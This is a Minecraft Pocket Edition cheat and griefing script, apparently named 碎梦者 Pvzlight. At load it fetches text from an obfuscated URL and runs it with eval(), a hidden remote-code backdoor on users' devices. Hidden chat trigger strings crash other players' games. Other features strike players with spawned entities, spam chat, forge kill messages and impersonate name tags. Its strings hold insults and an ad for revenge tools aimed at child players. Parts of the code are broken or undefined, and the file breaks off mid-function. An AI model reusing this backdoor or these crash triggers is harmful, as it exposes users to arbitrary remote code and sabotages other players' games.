var 小学生名称 = ["残心魄", "xy30308", "喜阳洋", "一只喜羊羊", "太阳的后羿233", "天才8895", "小y飞车", "雪雪仙女i", "残风极影", "唐城战", "我叫雷神中的血神", "我是大凋零", "小曰本250", "汗人中国人", "呵呵ILove你", "我就呵呵了", "当今圣上呵呵", "TF苦力怕", "不许骂王俊凯", "TFBoys帅", "盒中明星万人尊敬", "我是明星诶", "我爷爷奶奶了不起", "海洋女神vs李葛格", "释迦摩尼盒", "我爱吃奥特馒", "超级无敌奥特馒", "超能圣光迪莫", "超能阿布ilove", "超能太监", "小提子", "心甜梦AB", "超级无敌大侠", "白玉龙YY", "雨后的苦力怕", "蜡笔打新668", "不操不闹2333", "不糙补脑233", "我爱于少", "我爱鱼少", "我爱鱼少啊", "我喜欢鱼少", "威少很酷666", "一只罗小丁", "K麒麟苦力怕", "致命微笑", "籽岷喜欢盒zi", "籽岷爱护小动物", "盒籽君233", "打倒Q块", "minebox", "我叫非零", "零李格格", "李格格YH", "炸1妈盒2子", "罗志洋", "罗小丁LOVE", "美人鱼少啊", "灭世神花", "神的传人", "魔王真嘉", "盒籽帝王", "盒籽万岁66623", "第三小学李", "末影人哥哥6666", "Iam苦力怕姐姐", "天使慧慧", "美丽无价", "我很漂亮真的233", "不要污要233", "罗vs罗小丁", "李割嗝的小弟", "我是他哥哥", "pe炎黄", "mcpe炎黄", "pe创世神", "我觉得盒zi很好", "因盒而生", "盒籽vs籽岷", "奇呀真奇怪君", "仰望天空4685", "宇宙之帝698", "世界上最后一只苦力怕2", "世界上最后一只苦力怕", "牛B人生", "我很牛B", "比你牛B", "你没我牛B", "我比你牛多了", "基巴稽ba", "稽扒盒籽", "鲨B多丸", "炸抹盒籽吃枣糕丸", "多丸你抹B58", "yzr扬紫韧", "任我要", "QDYUWQF", "EOGHW", "剁你机扒", "生死主机", "生死猪机", "亡者荣耀", "荣耀亡者", "热咖啡85", "贴巴250", "盒籽520", "情何以堪啊250", "刘芒刘大师", "李浩解123", "不知道啊250", "王整148927821", "QWQQVO", "KKUINDWSF", "ZhaMa5864", "FlyCreeper666", "Her0brine", "盒籽2012", "微笑猫", "微笑咩", "阿里卤鸭", "哇咔咔咔233", "战士风云劫", "暴风战神666", "奥特馒233", "铠甲勇士盒体", "帝皇铠甲盒体666", "我盒你love", "我love盒very", "反盒的都去", "只有高手才来", "不是高手滚", "传说风云魔刀", "妖魔鬼帝", "萌萌魅汁233", "魅族MX250", "白猫警长", "僵尸爱史蒂夫", "屎蒂夫23333"];
var 白块内容 = ["§f▉§0▉▉▉▉▉▉▉▉▉", "§0▉§f▉§0▉▉▉▉▉▉▉▉", "§0▉▉§f▉§0▉▉▉▉▉▉▉", "§0▉▉▉§f▉§0▉▉▉▉▉▉", "§0▉▉▉▉§f▉§0▉▉▉▉▉", "§0▉▉▉▉▉§f▉§0▉▉▉▉", "§0▉▉▉▉▉▉§f▉§0▉▉▉", "§0▉▉▉▉▉▉▉§f▉§0▉▉", "§0▉▉▉▉▉▉▉▉§f▉§0▉", "§0▉▉▉▉▉▉▉▉▉§f▉"]
var smsg = {
    mc: "MINECRAFTMINECRAFTMINECRAFTMINECRAFTMINECRAFTMINECRAFTMINECRAFTMINECRAFTMINECRAFTMINECRAFTMINECRAFTMINECRAFTMINECRAFTMINECRAFTMINECRAFTMINECRAFTMINECRAFTMINECRAFTMINECRAFTMINECRAFTMINECRAFTMINECRAFTMINECRAFTMINECRAFTMINECRAFT",
    cm: "TFARCENIMTFARCENIMTFARCENIMTFARCENIMTFARCENIMTFARCENIMTFARCENIMTFARCENIMTFARCENIMTFARCENIMTFARCENIMTFARCENIMTFARCENIMTFARCENIMTFARCENIMTFARCENIMTFARCENIMTFARCENIMTFARCENIMTFARCENIMTFARCENIMTFARCENIMTFARCENIMTFARCENIMTFARCENIM"
}

const JSName = testFor("碎梦者Pvzlight").replace(fang(), rnull());
const JSAuthor = testFor("Pvzlight");
const JSVer = testFor("Pvzlight1.5.0.8").replace(fang(), rnull());

var 真 = true,
    假 = false,
    空 = "",
    USE炸妈盒子 = 假,
    首页公告, HTML状态 = "(暂无公告)",
    已联机 = 假,
    首次打开 = 真;

var 功能开关 = [假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假, 假];

var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get()

var 包 = ctx.getPackageName(),
    包名 = null,
    包描述 = null;

var 版本 = ModPE.getMinecraftVersion();

const 字母 = ["", "", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "N", "M", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"]

const 白名单 = ["net.zhuoweizhang.mcpelauncher", "net.zhuoweizhang.mcpelauncher.pro", "io.mrarm.mctoolbox", "com.huluxia.mctool", "com.duowan.groundhog.mctools"]

var astr = ["把启动器挂在后台,然后打开联机盒子.\n把联机盒子的启动模式改成手动.\n然后进去一个房间,停留在标题画面.\n接下来切换到后台的启动器.\n点击两下\"联盒外进\"游戏会自动关闭,\n最后再启动游戏就成功了!", "§e[多玩MC联机]", "富强,民主,文明,和谐,自由,平等,公正,法制,爱国,敬业,诚信,友善", "到此一游", "正在为你进行第一次启动", "启动游戏\n加载脚本\n......", "启动游戏\n加载脚本\n游戏便利\n......", "这是一个侵权软件", "这玩意还需要描述?\n这就是一个垃圾!\n盒子君盒子娘死妈！", "未知", "<b><font color=#FF0000>欢</font><font color=#FF7F00>迎</font><font color=#FFFF00>使</font><font color=#00FF00>用</font><font color=#00FFFF>碎</font><font color=#0000FF>梦</font><font color= #8B00FF>者</font>", "<font color=#1482bb>★</font>", "<font color=#1482bb>☆</font>", "你已被作者请出房间！", "PVZLIGHT\n", "§‭X0167", "不好意思不欢迎葫芦狗！", "§b[碎梦者]", "Multiplayers master", ["2OO", "4O4O", "MC11O"], "你还在为遇到小学生房主无法报仇而记恨吗？你还在为如何报仇而伤脑筋吗？那就用我们的软件吧！ 没错，日妈平台和日妈神盒就是你的报仇神器，快开始让小学生日妈吧！日妈软件官方审核群 386216106", "断开连接！", "出现错误", "获取公告失败！", "§4碎梦者Pvzlight将会摧毁你的梦！"];

if (包 == 白名单[0] || 包 == 白名单[1]) {
    包名 = "方块启动器";
    包描述 = astr[5];
} else if (包 == 白名单[2]) {
    包名 = "Toolbox";
    包描述 = astr[6];
} else if (包 == 白名单[3]) {
    包名 = "葫芦瞎";
    包描述 = astr[7];
} else if (包 == 白名单[4]) {
    包名 = "炸妈盒子";
    USE炸妈盒子 = 真;
    包描述 = astr[8];
} else {
    包名 = "未知";
    包描述 = astr[9]
}

var 屏幕高度 = ctx.getWindowManager().getDefaultDisplay().getHeight();

var 屏幕宽度 = ctx.getWindowManager().getDefaultDisplay().getWidth();

var 我的名称 = 获取玩家名字(获取玩家实体())

var 社会主义核心价值观 = ["富强", "民主", "文明", "和谐", "自由", "平等", "公正", "法制", "爱国", "敬业", "诚信", "友善", 0, ]

var info信息 = ["你在途中可能会遇到Pvzlight其他使用这个JS的玩家,系统会自动告诉你是哪些玩家.", "你可以点击Pvzlight\"团队\"给他们发送一条密语", "你还可能会遇到使用篡改这个PvzlightJS的玩家,系统不会告诉你是哪些玩家.", "但你可以点击\"防御\"让他们Pvzlight的客户端爆炸", "碎梦者PvzlightJS持续更新,固定下载地址:", "http://Pvzlightyun.baidu.com/share/link?shareid=1785914742&uk=1870700783", "§1§2§8§9§1§0§0§1§6§8", "§1§2§8§9§1§0§0§1§6§9"]

function rnull() {
    return ""
}

function getColor(r, y, b, a) {
    return android.graphics.Color.argb(a, r, y, b)
}

function dip2px(ctx, dips) {
    return Math.ceil(dips * ctx.getResources().getDisplayMetrics().density);
}

function 生成随机数(min, max) {
    return Math.floor(Math.random() * (max - min)) + min
}

function 设置游戏模式(type) {
    Level.setGameMode(type)
}

function 放置方块(x, y, z, id, date) {
    if (id == null) {
        id = 1
    }
    if (date == null) {
        date = 0
    }
    setTile(x, y, z, id, date)
}

function 获取游戏模式() {
    return Level.getGameMode()
}

function 设置游戏时间(time) {
    Level.setTime(time)
}

function 手中物品() {
    return Player.getCarriedItem();
}

function 获取玩家名字(name) {
    return Player.getName(name)
}

function 传送实体(ent, x, y, z) {
    setPosition(ent, x, y, z);
}

function 传送玩家(x, y, z) {
    setPosition(获取玩家实体(), x, y, z);
}

function 获取玩家实体() {
    return getPlayerEnt()
}

function 实体是否为玩家(实体) {
    return Player.isPlayer(实体)
}

function 获取实体血量(实体) {
    return Entity.getHealth(实体)
}

function 设置实体血量(实体, 血量) {
    Entity.setHealth(实体, 血量);
}

function 移除所有药水效果(实体) {
    Entity.removeAllEffects(实体);
}

function 设置实体铭牌(实体, 名字) {
    Entity.setNameTag(实体, 名字)
}

function 生成粒子(a, b, c, d, e, f, g, h) {
    Level.addParticle(a, b, c, d, e, f, g, h)
}

function 添加物品(a, b, c) {
    addItemInventory(a, b, c)
}

function tip(文本) {
    ModPE.showTipMessage("\n\n§d" + 文本)
}

function 手中物品ID() {
    return Player.getSelectedSlotId()
}

function 附魔(物品, 魔种, 等级) {
    Player.enchant(物品, 魔种, 等级);
}

function 玩家是否能飞(是否) {
    Player.setCanFly(是否)
}

function 爆炸(x, y, z, r) {
    Level.explode(x, y, z, r)
}

function 发送消息(文本) {
    switch (功能开关[13]) {
        case 假:
            Entity.setNameTag(getPlayerEnt(), 空);
            Server.sendChat(文本);
            break;
        case 真:
            输出消息(文本);
            break;
    }
}

function 破坏方块(x, y, z, be) {
    Level.destroyBlock(x, y, z, be)
}

function 带名字发送消息(name, 文本) {
    switch (功能开关[13]) {
        case 假:
            Entity.setNameTag(获取玩家实体(), name);
            Server.sendChat(文本);
            break;
        case 真:
            输出消息("<" + name + "> " + 文本);
            break;
    }
}

function 输出JS消息(文本) {
    clientMessage("§2碎梦者§8>>§7" + 文本)
}

const sdka = new android.os.Environment.getExternalStorageDirectory().getAbsolutePath();

const 配置 = sdka + "/games/com.mojang/碎梦者/";

if (!存在文件(配置)) {
    调试输出(astr[4]);
    创建文件(配置);
    创建文件(配置 + "images/");
    创建文件(配置 + "script/");
    写出文件(配置 + "info.txt", "脚本名称: 碎梦者\n脚本作者: Pvzlight\n脚本版本: %ver\n游戏版本: %k\n启动工具: %q".replace("%ver", JSVer).replace("%q", 包名).replace("%k", 版本));
}


function 关闭游戏() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get()
    ctx.runOnUiThread(new java.lang.Runnable({
        run: function() {
            ctx.finish()
        }
    }))
}

function 输出消息(文本) {
    clientMessage(文本)
}

function 解(s) {
    return unescape(s.replace(/\\(u[0-9a-fA-F]{4})/gm, '%$1'));
}

function 如果(a, b, c, d, e) {
    switch (b) {
        case 0:
            if (a > c) {
                eval(d)
            } else {
                if (e != null) {
                    eval(e)
                }
            };
            break;
        case 1:
            if (a < c) {
                eval(d)
            } else {
                if (e != null) {
                    eval(e)
                }
            };
            break;
        case 2:
            if (a == c) {
                eval(d)
            } else {
                if (e != null) {
                    eval(e)
                }
            };
            break;
        case 3:
            if (a != c) {
                eval(d)
            } else {
                if (e != null) {
                    eval(e)
                }
            };
            break;
    }
}

var pvzvery6, neirong;
var msgwj = ["/games/com.mojang/minecraftpe/.external_server.txt", "/games/com.mojang/minecraftpe/.external_server.txt", "/games/com.mojang/minecraftpe/externalPvzlight_servers.txt", "/games/com.mojang/minecraftpe/externalPvzlight_servers.txt", "1:", "2:", "...: ", ": ", "\n"];

function 读入文件(目录) {
    var 内容 = 空,
        读 = java.io.BufferedReader(new java.io.FileReader(目录)),
        文本内容 = 读.readLine();
    while (文本内容) {
        内容 += 文本内容 + "\n";
        文本内容 = 读.readLine();
    }
    return 内容;
}

function 写出文件(目录, 内容) {
    new java.io.FileOutputStream(目录).write(new java.lang.String(空 + 内容).getBytes());
}

function 打开文件(文件) {
    return java.io.File(文件)
}

function 创建文件(文件) {
    new java.io.File(文件).mkdirs()
}

function 存在文件(文件) {
    return 打开文件(文件).exists()
}
String.prototype.偷梁换柱 = function(s1, s2) {
    return this.replace(new RegExp(s1, "gm"), s2);
}

function 调试输出(文本, type) {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get()
    ctx.runOnUiThread(new java.lang.Runnable({
        run: function() {
            if (type == null) {
                android.widget.Toast.makeText(ctx, 色("<font color=#FFA500>碎梦者</font>: " + 文本), 10).show()
            } else if (type != 1) {
                android.widget.Toast.makeText(ctx, 色(文本), 10).show()
            } else {
                ctx.runOnUiThread(new java.lang.Runnable() {
                    run: function() {
                        android.widget.Toast.makeText(ctx, 色(astr[10]), 0).show();

                    }
                });
            }
        }
    }))
}

function 信息框(a, b, type) {
    var str = null;
    if (type == null) {
        var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get()
        ctx.runOnUiThread(new java.lang.Runnable({
            run: function() {
                var 新信息框 = new android.app.AlertDialog.Builder(ctx)
                if (b == null) {
                    新信息框.setTitle("碎梦者")
                } else {
                    新信息框.setTitle(a)
                }
                if (b == null) {
                    新信息框.setMessage(a);
                    str = a
                } else {
                    新信息框.setMessage(b);
                    str = b
                }
                新信息框.setPositiveButton("确定", new android.content.DialogInterface.OnClickListener() {
                    onClick: function(dia, w) {}
                });
                新信息框.show()
            }
        }))
    }
}

function cannotgetcmd() {
    调试输出(astr[22]);
    HTML状态 = "(无法获取公告)"
}

function 换(文本, 替换) {
    return 文本.偷梁换柱("%s", 替换)
}

function ban(a) {
    if (a + "\n" == getid()) {
        功能开关[19] = 真;
    }
}

function getid() {
    return pvzvery6
};

function x0167_X1D7() {
    var x0167_X1B7 = "";
    if (!存在文件(sdka + 解(iVBORw0KGC))) {
        if (!存在文件(sdka + 解(iVBORw0KGCC))) {
            创建文件(sdka + 解(iVBORw0KGCC))
        }
        for (var i = 0; i < 8; i++) {
            x0167_X1B7 = x0167_X1B7 + 字母[生成随机数(0, 25)]
        }
        写出文件(sdka + 解(iVBORw0KGC), x0167_X1B7);
        pvzvery6 = 读入文件(sdka + 解(iVBORw0KGC));
    } else {
        pvzvery6 = 读入文件(sdka + 解(iVBORw0KGC));
    }
}
x0167_X1D7();

function 黑屏() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, 屏幕宽度, 屏幕高度);
        menu.setFocusable(false);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);
        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(屏幕宽度);
        menu.setHeight(屏幕高度);
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(255, 0, 0, 0)));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 0), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err);
    }
}

function X0167_DJSHE() {
    try {
        var a = new java.io.ByteArrayOutputStream();
        android.net.http.AndroidHttpClient.newInstance("checkfortext()").execute(new org.apache.http.client.methods.HttpGet(解(iVBORw0KGWD))).getEntity().writeTo(a);
        a.close();
        var 文本 = String(a.toString().match(new RegExp("%s.*%s".偷梁换柱("%s", 解("۩")), "g"))).split(解("۩"));
        eval(文本[1]);
    } catch (err) {
        cannotgetcmd()
    }
}

function fang() {
    const KeyZhama = "com.zhama.mojang.minecraftPE.vs.land"
    var KeyMCPE = KeyZhama.split("");
    var KeyJScript = KeyMCPE[26] + KeyMCPE[29] + KeyMCPE[4] + KeyMCPE[32] + KeyMCPE[18] + KeyMCPE[15] + KeyMCPE[5] + KeyMCPE[25];
    return KeyJScript;
}

function testFor(text) {
    var i = 0;
    if (text.search(fang()) == -1) {
        关闭游戏();
        return null;
    } else {
        return text
    }
}

function entityAddedHook(实体) {
    if (实体是否为玩家(实体) == 真) {
        if (实体 == 获取玩家实体()) {
            输出JS消息("%player%加入游戏.".偷梁换柱("%player%", 获取玩家名字(实体)));
        }
    }
}
var 队友召唤 = getid();

function chatReceiveHook(消息, sender) {
    if (sender == "" || sender == " " || sender == null) {
        发送者 = "碎梦者"
    } else {
        发送者 = sender
    }
    if (消息.search("e§碎梦者") != -1) {
        var 分析 = 消息.split("Ⅲ");
        输出消息(换("§6%s§7: ", 分析[1]) + 分析[2]);
    };
    if (消息 == astr[15] && 功能开关[21] == 真) {
        ifa()
    }
    if (消息 == "§1§2§8§9§1§0§0§1§6§8") {
        输出消息(换("§6" + 发送者 + "§7: %s", "§b@全体成员"));
        调试输出(换("<font color=#FFA500>%s</font>: @全体成员", 发送者), "多玩死妈");
    }
    if (消息 == "§1§2§8§9§1§0§0§1§6§9") {
        ifjsname();
    }
}
if (修复模式 == 假) {
    X0167_DJSHE()
}
if (修复模式 == 真) {
    信息框("你现在是修复模式,部分功能你将无法使用,将此脚本中第一行\"修复模式= true\"的\"true\"改成\"false\"即可关闭此模式!")
}
var 旧的端口 = 0,
    新的端口 = 0,
    次 = [0, 0, 0, ];

function f5port() {
    旧的端口 = Server.getPort();
    if (旧的端口 != 0) {
        已联机 = 真
    } else {
        已联机 = 假
    }
    if (已联机 == 真) {
        if (旧的端口 != 新的端口) {
            新的端口 = 旧的端口
            var 端口变化提示 = ["房主: §6", "端口现在是: §6", "§7！"]
            输出JS消息("地图名称: §6" + Level.getWorldName());
            输出JS消息(端口变化提示[1] + 新的端口 + 端口变化提示[2]);
        }
    }
}

function modTick() {
    var 生物 = Entity.getAll();
    if (功能开关[17] == 真) {
        for (var i = 0; i < 生物.length; i++) {
            var a = Entity.getX(生物[i]) - getPlayerX(),
                b = Entity.getY(生物[i]) - getPlayerY(),
                c = Entity.getZ(生物[i]) - getPlayerZ();
            var 色 = "§a";
            if (a * a + b * b + c * c <= 20 * 20 && 生物[i] != 获取玩家实体()) {
                if (Entity.getEntityTypeId(生物[i]) == 10) {
                    设置实体铭牌(生物[i], "鸡 " + 色 + 获取实体血量(生物[i]))
                }
                if (Entity.getEntityTypeId(生物[i]) == 11) {
                    设置实体铭牌(生物[i], "牛 " + 色 + 获取实体血量(生物[i]))
                }
                if (Entity.getEntityTypeId(生物[i]) == 12) {
                    设置实体铭牌(生物[i], "猪 " + 色 + 获取实体血量(生物[i]))
                }
                if (Entity.getEntityTypeId(生物[i]) == 13) {
                    设置实体铭牌(生物[i], "羊 " + 色 + 获取实体血量(生物[i]))
                }
                if (Entity.getEntityTypeId(生物[i]) == 14) {
                    设置实体铭牌(生物[i], "狼 " + 色 + 获取实体血量(生物[i]))
                }
                if (Entity.getEntityTypeId(生物[i]) == 15) {
                    设置实体铭牌(生物[i], "村民 " + 色 + 获取实体血量(生物[i]))
                }
                if (Entity.getEntityTypeId(生物[i]) == 16) {
                    设置实体铭牌(生物[i], "蘑菇牛 " + 色 + 获取实体血量(生物[i]))
                }
                if (Entity.getEntityTypeId(生物[i]) == 17) {
                    设置实体铭牌(生物[i], "鱿鱼 " + 色 + 获取实体血量(生物[i]))
                }
                if (Entity.getEntityTypeId(生物[i]) == 19) {
                    设置实体铭牌(生物[i], "蝙蝠 " + 色 + 获取实体血量(生物[i]))
                }
                if (Entity.getEntityTypeId(生物[i]) == 20) {
                    设置实体铭牌(生物[i], "铁傀儡 " + 色 + 获取实体血量(生物[i]))
                }
                if (Entity.getEntityTypeId(生物[i]) == 21) {
                    设置实体铭牌(生物[i], "雪傀儡 " + 色 + 获取实体血量(生物[i]))
                }
                if (Entity.getEntityTypeId(生物[i]) == 22) {
                    设置实体铭牌(生物[i], "豹猫 " + 色 + 获取实体血量(生物[i]))
                }
                if (Entity.getEntityTypeId(生物[i]) == 32) {
                    设置实体铭牌(生物[i], "僵尸 " + 色 + 获取实体血量(生物[i]))
                }
                if (Entity.getEntityTypeId(生物[i]) == 33) {
                    设置实体铭牌(生物[i], "苦力怕 " + 色 + 获取实体血量(生物[i]))
                }
                if (Entity.getEntityTypeId(生物[i]) == 34) {
                    设置实体铭牌(生物[i], "骷髅 " + 色 + 获取实体血量(生物[i]))
                }
                if (Entity.getEntityTypeId(生物[i]) == 35) {
                    设置实体铭牌(生物[i], "蜘蛛 " + 色 + 获取实体血量(生物[i]))
                }
                if (Entity.getEntityTypeId(生物[i]) == 36) {
                    设置实体铭牌(生物[i], "僵尸猪人 " + 色 + 获取实体血量(生物[i]))
                }
                if (Entity.getEntityTypeId(生物[i]) == 37) {
                    设置实体铭牌(生物[i], "史莱姆 " + 色 + 获取实体血量(生物[i]))
                }
                if (Entity.getEntityTypeId(生物[i]) == 38) {
                    设置实体铭牌(生物[i], "末影人 " + 色 + 获取实体血量(生物[i]))
                }
                if (Entity.getEntityTypeId(生物[i]) == 39) {
                    设置实体铭牌(生物[i], "虫子 " + 色 + 获取实体血量(生物[i]))
                }
                if (Entity.getEntityTypeId(生物[i]) == 40) {
                    设置实体铭牌(生物[i], "洞穴蜘蛛 " + 色 + 获取实体血量(生物[i]))
                }
                if (Entity.getEntityTypeId(生物[i]) == 41) {
                    设置实体铭牌(生物[i], "恶魂 " + 色 + 获取实体血量(生物[i]))
                }
                if (Entity.getEntityTypeId(生物[i]) == 42) {
                    设置实体铭牌(生物[i], "岩浆怪 " + 色 + 获取实体血量(生物[i]))
                }
                if (Entity.getEntityTypeId(生物[i]) == 43) {
                    设置实体铭牌(生物[i], "烈焰人 " + 色 + 获取实体血量(生物[i]))
                }
            }
        }
    }

    if (功能开关[23] == 真) {
        var x = getPlayerX(),
            y = getPlayerY(),
            z = getPlayerZ();
        for (var i = 1; i <= 20; i++) {
            破坏方块(x, y + 10 - i, z, 假);
            破坏方块(x + 1, y + 10 - i, z, 假);
            破坏方块(x - 1, y + 10 - i, z, 假);
            破坏方块(x, y + 10 - i, z + 1, 假);
            破坏方块(x, y + 10 - i, z - 1, 假)
        }
    }
    if (功能开关[24] == 真) {
        var x = getPlayerX(),
            y = getPlayerY(),
            z = getPlayerZ();
        for (var i = 1; i <= 20; i++) {
            破坏方块(x, y + 10 - i, z, 假);
        }
    }
    if (功能开关[25] == 真) {
        var 玩家列表 = get全部玩家();
        for (var i = 0; i < 玩家列表.length; i++) {
            if (玩家列表[i] != 获取玩家实体()) {
                Level.spawnMob(Entity.getX(玩家列表[i]), Entity.getY(玩家列表[i]), Entity.getZ(玩家列表[i]), 93);
            }
        }
    }
    if (功能开关[26] == 真) {
        var x = Entity.getX(Player.getPointedEntity());
        var y = Entity.getY(Player.getPointedEntity());
        var z = Entity.getZ(Player.getPointedEntity());
        if (Player.getPointedEntity() != null && Player.getPointedEntity() != -1) {
            Entity.setFireTicks(Player.getPointedEntity(), 60);
            Level.addParticle(ParticleType.cloud, x, y, z, 0, 0, 0, 20);
            Level.addParticle(ParticleType.cloud, x - 1, y, z + 1, 0, 0, 0, 20);
            Level.addParticle(ParticleType.cloud, x + 1, y, z - 1, 0, 0, 0, 20);
            Level.addParticle(ParticleType.cloud, x + 1, y - 1, z + 1, 0, 0, 0, 20);
            Level.addParticle(ParticleType.cloud, x - 1, y - 1, z - 1, 0, 0, 0, 20);
            Level.addParticle(ParticleType.cloud, x - 1, y - 1, z + 1, 0, 0, 0, 20);
            Level.addParticle(ParticleType.cloud, x + 1, y - 1, z - 1, 0, 0, 0, 20);
            Level.addParticle(ParticleType.cloud, x + 1, y - 2, z + 1, 0, 0, 0, 20);
            Level.addParticle(ParticleType.cloud, x - 1, y - 2, z - 1, 0, 0, 0, 20);
            Level.addParticle(ParticleType.cloud, x - 1, y - 2, z + 1, 0, 0, 0, 20);
            Level.addParticle(ParticleType.cloud, x + 1, y - 2, z - 1, 0, 0, 0, 20);
        }
    }
    if (功能开关[27] == 真) {
        if (Player.getPointedEntity() != null && Player.getPointedEntity() != -1) {
            Level.spawnMob(Entity.getX(Player.getPointedEntity()), Entity.getY(Player.getPointedEntity()), Entity.getZ(Player.getPointedEntity()), 93);
        }
    }
    if (功能开关[33] == 真) {
        if (功能开关[34] == 假) {
            功能开关[34] = 真;
            发送消息("§b§l§o§n" + 色表[生成随机数(0, 色表.length)] + smsg.mc)
        } else {
            功能开关[34] = 假;
            发送消息("§b§l§o§n" + 色表[生成随机数(0, 色表.length)] + smsg.cm)
        }
    }

    if (功能开关[22] == 真) {
        次[0]++;
        if (次[0] > 200) {
            关闭游戏();
        }
    }
    if (实体是否为玩家(Player.getPointedEntity()) == 真) {
        if (获取实体血量(Player.getPointedEntity()) <= 25) {
            tip("§a" + 获取玩家名字(Player.getPointedEntity()) + 换("§c %s/20", 获取实体血量(Player.getPointedEntity())));
        } else {
            tip("§4哎哟?" + 获取玩家名字(Player.getPointedEntity()) + "开挂了?")
        }
    }
    f5port();
    if (功能开关[13] == 真) {
        tip("§c调试模式下所有功能仅自己可见")
    }
    if (功能开关[14] == 真) {
        别踩白块()
    }
}


function ifa() {
    if (getid() != astr[14]) {
        信息框(astr[13]);
        功能开关[22] = 真
    }
}

function newLevel() {
    var 游戏模式;
    if (Level.getGameMode() == 0) {
        游戏模式 = "生存模式";
    } else if (Level.getGameMode() == 1) {
        游戏模式 = "创造模式";
    } else {
        游戏模式 = "未知"
    }

    输出JS消息("地图名称: §6" + Level.getWorldName());
    输出JS消息("游戏模式: §6" + 游戏模式);
    if (USE炸妈盒子 == 真) {
        输出JS消息("§d你是用\"炸妈盒子\"启动游戏的！");
    }
}

function leaveGame() {
    for (var i = 0; i < 功能开关.length; i++) {
        if (功能开关[i] == 真 && i != 21 && i != 19) {
            功能开关[i] == 假;
        }
    }
    where终末之诗 = 假;
    队友召唤 = getid();
    旧的端口 = 0;
    新的端口 = 0;
    已联机 = 假;
}

function attackHook(a, v) {
    if (v == 获取玩家实体()) {
        if (实体是否为玩家(a) == 真) {
            tip(换("玩家%s打了你一下", 获取玩家名字(a)))
        }
    }
    if (功能开关[18] == 真) {
        if (a == 获取玩家实体() && 实体是否为玩家(v) == 真) {
            var 玩家列表 = get全部玩家();
            for (var i = 0; i <= 玩家列表.length; i++) {
                发送消息(换(获取玩家名字(玩家列表[i]) + " 杀死了 %s", 获取玩家名字(v)));
            }
        }
    }
}


function projectileHitEntityHook(实体, 被砸中的实体) {
    if (实体是否为玩家(被砸中的实体) == 真) {
        if (被砸中的实体 == 获取玩家实体()) {
            if (实体 == EntityType.ARROW) {
                tip("你中箭了!");
            }
        } else {
            if (实体 == EntityType.ARROW) {
                tip(换("玩家%s中箭了!", 获取玩家名字(被砸中的实体)));
            }
        }
    }
}


function 分隔(mainb) {
    var newt =
        newt.setText(null)
    newt.setTextSize(2)
    mainb.addView(newt)
    return newt
}


function ifjsname() {
    if (JSName != "做梦的作者".replace("做", "碎").replace("的作", 空)) {
        发送消息("§cBOOM！篡改狗%player%的客户端爆炸了！".偷梁换柱("%player%", 我的名称));
        发送消息("§cBOOM！篡改狗%player%的客户端爆炸了！".偷梁换柱("%player%", 我的名称));
        发送消息("§cBOOM！篡改狗%player%的客户端爆炸了！".偷梁换柱("%player%", 我的名称));
        关闭游戏();
    }
}
var 色表 = ["§1", "§2", "§3", "§4", "§5", "§6", "§7", "§8", "§9", "§0", "§a", "§b", "§c", "§d", "§e", "§f", ]

function 随机颜色() {
    return 色表[生成随机数(0, 16)]
}

function 创建快捷方式(name, cmd) {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var 坐标x = 屏幕宽度,
        坐标y = ctx.getWindowManager().getDefaultDisplay().getHeight() / 2,
        坐标x1, 坐标y1, 坐标x2, 坐标y2;
    ctx.runOnUiThread(new java.lang.Runnable({
        run: function() {
            try {
                var 窗口 = new android.widget.PopupWindow();
                var layout = new android.widget.RelativeLayout(ctx),
                    按钮 = new android.widget.Button(ctx);
                按钮.setText(name);
                按钮.setOnClickListener(new android.view.View.OnClickListener({
                    onClick: function(v) {
                        eval(cmd);
                    }
                }))

                按钮.setOnTouchListener(new android.view.View.OnTouchListener({
                    onTouch: function(v, e) {
                        switch (e.getAction()) {
                            case 0:
                                坐标x1 = e.getX();
                                坐标y1 = e.getY();
                                break;
                            case 2:
                                坐标x2 = parseInt(e.getX() - 坐标x1) * -3 / 10;
                                坐标y2 = parseInt(e.getY() - 坐标y1) * -3 / 10;
                                坐标x = 坐标x + 坐标x2;
                                坐标y = 坐标y + 坐标y2;
                                窗口.update(坐标x, 坐标y, -1, -1);
                                break;
                        }
                        return 假;
                    }
                }));
                layout.addView(按钮);
                窗口.setContentView(layout);
                窗口.setWidth(ctx.getWindowManager().getDefaultDisplay().getWidth() / 16);
                窗口.setHeight(ctx.getWindowManager().getDefaultDisplay().getHeight() / 10);
                窗口.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
                窗口.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.BOTTOM | android.view.Gravity.RIGHT, 坐标x, 坐标y);
            } catch (err) {
                调试输出(err);;
            }
        }
    }));
}


function 主要按钮() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var 坐标x = 0,
        坐标y = 屏幕高度 / 1.5,
        坐标x1, 坐标y1, 坐标x2, 坐标y2;
    ctx.runOnUiThread(new java.lang.Runnable({
        run: function() {
            try {
                var 窗口 = new android.widget.PopupWindow();
                var layout = new android.widget.RelativeLayout(ctx),
                    按钮 = new android.widget.ImageView(ctx);
                var 群 = android.util.Base64.decode(iVBORw0KG, 0);
                按钮.setImageBitmap(android.graphics.BitmapFactory.decodeByteArray(群, 0, 群.length));
                按钮.setLayoutParams(大小(屏幕宽度 / 8, 屏幕高度 / 8));
